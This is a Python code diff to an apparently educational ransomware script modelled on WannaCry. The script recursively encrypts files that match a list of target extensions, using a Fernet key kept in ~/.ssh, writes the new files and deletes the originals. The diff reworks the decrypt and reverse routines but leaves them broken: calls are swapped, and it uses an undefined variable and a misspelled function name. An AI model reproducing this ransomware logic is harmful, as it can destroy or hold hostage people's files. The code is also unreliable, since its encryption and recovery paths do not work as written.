@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 #!/Users/lcasado-/miniconda3/envs/42AI-stockholm/bin/python
 #!/home/luis/anaconda3/envs/42AI-stockholm/bin/python
 
@@ -10,11 +11,12 @@ except ModuleNotFoundError:
     print("Module argaprse is required.")
 
 HOME = os.environ["HOME"]
+
+
 def encrypt_content(content):
 
     try:
         # get the key i will use to seed cifer tool
-        cwd = os.getcwd()
         cifer_key_path = os.path.join(HOME, ".ssh/.encrypt.key")
 
         with open(cifer_key_path, 'rb') as f:
@@ -33,32 +35,26 @@ def encrypt_content(content):
         print(msg)
 
 
-def decrypt_content(path_to_key):
-    path_file = os.path.split(path_to_key)
-    path = path_file[0]
+def decrypt_content(content_encrypted):
 
-    # read the key used to seed cifer tool
-    cifer_key_path = os.path.join(HOME, ".ssh/.encrypt.key")
     try:
+        # read the key used to seed cifer tool
+        cifer_key_path = os.path.join(HOME, ".ssh/.encrypt.key")
         with open(cifer_key_path, 'rb') as f:
             cifer_key = f.read()
+
+        # initialize encrypter wiht the key
+        fernet = Fernet(cifer_key)
+        
+        # decrypt TOTP Key
+        content = fernet.decrypt(content_encrypted)
+
+        return content
+
     except FileNotFoundError:
         msg = f"Not found {cifer_key_path}. "
         msg = msg + "Execute 'generate_encrypt_key.py"
         raise ValueError(msg)
-
-    # initialize encrypter wiht the key
-    fernet = Fernet(cifer_key)
-
-    # read TOTP encrypted key
-    with open(path_to_key, 'br') as f:
-        totp_key_encrypted = f.read()
-
-    # decrypt TOTP Key
-    key_cyphered = fernet.decrypt(totp_key_encrypted)
-
-    return key_cyphered
-
 
 
 def read_wannacry_extensions():
@@ -100,9 +96,9 @@ def recursive_encrypt(folderpath, silence):
 
                 with open(os.path.join(root, file), 'rb') as infile:
                     incontent = infile.read()
-                    ciperedcontent = encrypt_content(incontent)
+                    uncipheredcontent = decrypt_content(incontent)
                     with open(os.path.join(root, fileout), 'wb') as outfile:
-                        outfile.write(incontent)
+                        outfile.write(uncihperedcontent)
                 os.remove(os.path.join(root, file))
                 #try:
 
@@ -129,7 +125,7 @@ def recursive_reverse(folderpath, silence):
                 fileout = file_name
                 with open(os.path.join(root, file), 'rb') as infile:
                     incontent = infile.read()
-                    ciperedcontent = encrypt_content(incontent)
+                    ciperedcontent = deencrypt_content(incontent)
                     with open(os.path.join(root, fileout), 'wb') as outfile:
                         outfile.write(incontent)
                 os.remove(os.path.join(root, file))
